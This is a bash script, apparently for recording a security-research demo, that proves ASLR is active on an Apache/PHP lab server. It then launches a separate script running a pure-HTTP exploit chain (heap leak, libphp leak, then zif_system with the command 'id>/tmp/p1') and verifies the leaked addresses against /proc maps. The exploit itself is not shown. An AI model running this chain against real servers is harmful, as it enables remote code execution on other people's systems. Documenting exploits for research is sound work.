#!/bin/bash
# One-command ASLR demo for screen recording.
# Run on the target: bash ~/demo_aslr_video.sh
set -u
cd /home/debian/php2shell-work
S() { sudo -n "$@"; }
line() { printf '======================================================================\n'; }
say() { echo; line; printf '%s\n' "$*"; line; sleep 0.8; }
worker() { local m; m=$(pgrep -o -x apache2); [ -n "$m" ] && pgrep -P "$m" -x apache2 | tail -1; }
libbase() { S grep 'libphp.so' "/proc/$1/maps" 2>/dev/null | head -1 | cut -d- -f1; }
restart_aslr() {
  S bash -c 'apache2ctl -k stop 2>/dev/null; sleep 0.5; pkill -9 apache2 2>/dev/null; sleep 0.5; pkill -9 gdb 2>/dev/null; /usr/sbin/apache2ctl -k start; sleep 0.8' >/dev/null 2>&1
  local i
  for i in $(seq 1 50); do
    [ -n "$(pgrep -o -x apache2)" ] && [ -n "$(worker)" ] && return 0
    sleep 0.1
  done
  return 1
}

clear 2>/dev/null || true
say "0) 目标页面（普通 echo，无 session_start）"
S cat /var/www/php-lab/www/index.php
echo

say "1) 远程证明 ASLR 已开启"
echo -n "kernel.randomize_va_space = "
cat /proc/sys/kernel/randomize_va_space
echo "Apache 启动方式: /usr/sbin/apache2ctl -k start（未使用 setarch -R）"
echo "pure_aslr_run.sh 中 setarch 出现次数: $(grep -c setarch pure_aslr_run.sh || true)"
restart_aslr
M=$(pgrep -o -x apache2); W=$(worker)
echo "master=$M worker=$W"
echo -n "worker personality = "; S cat "/proc/$W/personality"
echo "worker libphp mapping:"; S grep 'libphp.so' "/proc/$W/maps" | head -1
B1=$(libbase "$W")
sleep 0.5
restart_aslr
M2=$(pgrep -o -x apache2); W2=$(worker)
echo "restart#2 master=$M2 worker=$W2"
echo -n "restart#2 worker personality = "; S cat "/proc/$W2/personality"
echo "restart#2 libphp mapping:"; S grep 'libphp.so' "/proc/$W2/maps" | head -1
B2=$(libbase "$W2")
echo "libphp base #1 = $B1"
echo "libphp base #2 = $B2"
if [ -n "$B1" ] && [ -n "$B2" ] && [ "$B1" != "$B2" ]; then
  echo "=> 两次 Apache 重启后 libphp base 不同：ASLR 生效"
else
  echo "!! 两次 base 相同，请检查启动方式"
fi

say "2) 设置 display_errors=1（旧链的 A 需要 warning 输出置 headers_sent）"
S sed -i 's/php_admin_value display_errors 0/php_admin_value display_errors 1/' /etc/apache2/conf-available/php8426.conf
grep display_errors /etc/apache2/conf-available/php8426.conf
S rm -f /tmp/p1

say "3) 纯 HTTP ASLR 全链：堆泄漏 -> libphp 泄漏 -> zif_system"
CHAIN_LOG=/tmp/demo_chain.log
CMD="id>/tmp/p1" bash pure_aslr_run.sh 2>&1 | tee "$CHAIN_LOG"

say "4) 命令执行结果"
if S test -f /tmp/p1; then
  S cat /tmp/p1
else
  echo "NO PROOF FILE"
fi

say "5) 交叉验证：泄漏的 libphp base vs 当前 worker maps"
LEAK=$(grep -oE 'libphp=0x[0-9a-f]+' "$CHAIN_LOG" | grep -v '=0x0$' | tail -1 | sed 's/.*=0x//')
W=$(worker)
if [ -n "${LEAK:-}" ] && [ -n "$W" ]; then
  MAP=$(libbase "$W")
  echo "Set-Cookie 泄漏的 libphp base = 0x$LEAK"
  echo "worker $W maps 中的 libphp  = $MAP"
  if [ "0x$LEAK" = "0x$MAP" ]; then
    echo "=> 完全一致：泄漏地址真实，ASLR 生效"
  else
    echo "=> 不一致（worker 可能已轮换；见上方 W2 行）"
  fi
else
  echo "无泄漏值或 worker 不存在，跳过"
fi

say "6) 恢复 display_errors=0"
S sed -i 's/php_admin_value display_errors 1/php_admin_value display_errors 0/' /etc/apache2/conf-available/php8426.conf
restart_aslr
grep display_errors /etc/apache2/conf-available/php8426.conf
echo "DEMO DONE"
